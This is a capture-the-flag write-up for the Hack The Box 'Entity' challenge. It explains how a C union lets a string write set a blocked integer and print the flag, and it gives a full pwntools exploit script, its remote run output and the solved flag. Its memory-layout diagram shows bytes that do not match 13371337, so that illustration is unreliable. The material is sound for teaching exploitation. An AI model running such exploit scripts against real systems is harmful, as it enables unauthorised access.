---
title: "Entity 👻 - Type Confusion, union trick"
tags: [HTB, pwn, C logic, union abuse, enum tricks]
---

# Entity 👻

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> This Spooky Time of the year, what's better than watching a scary film on the TV? 

> Well, a lot of things, like playing CTFs, but you know what's definitely not better? Something coming out of your TV!

A spooky `union` lets you trick logic into leaking the flag.

## 📚 Table of Contents
- [Binary Info 🧠](#binary-info-)
- [Code Analysis 🔍](#code-analysis-)
- [Vulnerability Summary 🧩](#vulnerability-summary-)
- [Exploit Strategy ✅](#exploit-strategy-)
- [Exploit Script 💣](#exploit-script-)
- [Exploitation Output 🎯](#exploitation-output-)
- [Conclusion 📘](#conclusion-)

## Binary Info 🧠

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

And the challenge provides us the full & clean original C code:
[Source code](entity.c)

## Code Analysis 🔍

### menu()

```c
switch (buf[0]) {
case 'T':
    res.act = STORE_SET;
    break;
case 'R':
    res.act = STORE_GET;
    break;
case 'C':
    res.act = FLAG;
    return res;
default:
    puts("\nWhat's this nonsense?!");
    exit(-1);
}
```
And:

```c
printf("\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> ");
fgets(buf, sizeof(buf), stdin);
buf[strcspn(buf, "\n")] = 0;
switch (buf[0]) {
case 'L':
    res.field = INTEGER;
    break;
case 'S':
    res.field = STRING;
    break;
default:
    printf("\nYou are doomed!\n");
    exit(-1);
}
```
User selects two things:
- Whether to `set`, `get`, or trigger the flag logic (`T`, `R`, `C`)
- Whether the data is of type `INTEGER` or `STRING` (`L`, `S`)

### main()

```c
switch (result.act) {
    case STORE_SET:
        set_field(...);
        break;
    case STORE_GET:
        get_field(...);
        break;
    case FLAG:
        get_flag();
        break;
}
```
Depending on the choice of the user in the menu, we trigger the set_field, get_field, or get_flag function.

### get_field()

```c
    switch (f) {
    case INTEGER:
        printf("%llu\n", DataStore.integer);
        break;
    case STRING:
        printf("%.8s\n", DataStore.string);
        break;
    }
```
A simple function that displays the values stored in DataStore. 

### set_field()

```c
char buf[32] = {0};
printf("\nMaybe try a ritual?\n\n>> ");
fgets(buf, sizeof(buf), stdin);
switch (f) {
case INTEGER:
    sscanf(buf, "%llu", &DataStore.integer);
    if (DataStore.integer == 13371337) {
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }
    break;
case STRING:
    memcpy(DataStore.string, buf, sizeof(DataStore.string));
    break;
```
A function that sets the DataStore.integer, **and** DataStore.string value depending on the previous user choice.

And `13371337` is blocked from `INTEGER` input.

### get_flag()

```c
if (DataStore.integer == 13371337)
    system("cat flag.txt");
```
A function who display the flag if the DataStore.integer is equal to 13371337.

## Vulnerability Summary 🧩

This challenge is all about one little trick:
- Memory reinterpretation via `union` (type confusion).

Here's the trick: As `DataStore` is a **union**, **writing `p64(13371337)` into `.string` modifies `.integer` too**.

### 🔬 Memory Layout (Visual)

```
union {
  unsigned long long integer;   // ← read
  char string[8];               // ← write
}

┌────────────────────────────┐
│ 0x59 │ 0x77 │ 0xCB │ 0x00 │ 0x00 │ 0x00 │ 0x00 │ 0x00 │ ← memory
└────────────────────────────┘
       ↑ write here      ↑ read as 13371337
```

13371337 = `0x00CC07C9` → `ÌÉ`

## Exploit Strategy ✅

1. Choose `STORE_SET` (`T`)
2. Select field `STRING` (`S`)
3. Inject `p64(13371337)` — which sets the internal `.integer`
4. Finally, trigger `get_flag()` after that

### ⚠️ Manual Input Note

Typing `"13371337"` in STRING mode doesn’t work — it copies the ASCII bytes:
```
[0x31 0x33 0x33 0x37 0x31 0x33 0x33 0x37]
```
Which gives a completely different `unsigned long long`.

## Exploit Script 💣

```python
#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './entity'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    return p64(13371337)

def perform_exploit(p):
    log.info("Sending STORE_SET + STRING path to manipulate union value...")
    p.sendlineafter(b">> ", b"T")  # STORE_SET
    p.sendlineafter(b">> ", b"S")  # STRING

    payload = build_payload()
    p.sendlineafter(b">> ", payload)
    p.sendlineafter(b">> ", b"C")
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit for Entity challenge (HTB)")
    parser.add_argument('--host', help='Remote host', required=False)
    parser.add_argument('--port', help='Remote port', required=False)
    args = parser.parse_args()

    p = get_process(args)
    perform_exploit(p)

if __name__ == '__main__':
    main()
```

```bash
python3 entity_exploit.py
python3 entity_exploit.py --host 1.2.3.4 --port 1337
```

## Exploitation Output 🎯

```bash
python exploit.py --host 94.237.58.4 --port 44965
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Opening connection to 94.237.58.4 on port 44965: Done
[*] Sending STORE_SET + STRING path to manipulate union value...
13371337
[*] Switching to interactive mode
HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
```

## Conclusion 📘

This challenge illustrates how a seemingly simple `union` type in C can become exploitable:
- It allows reinterpretation of memory in clever ways.
- A good example of **logic flaw + type confusion** to bypass input filtering.

🔙 [Back to Challenge Writeups](../../)
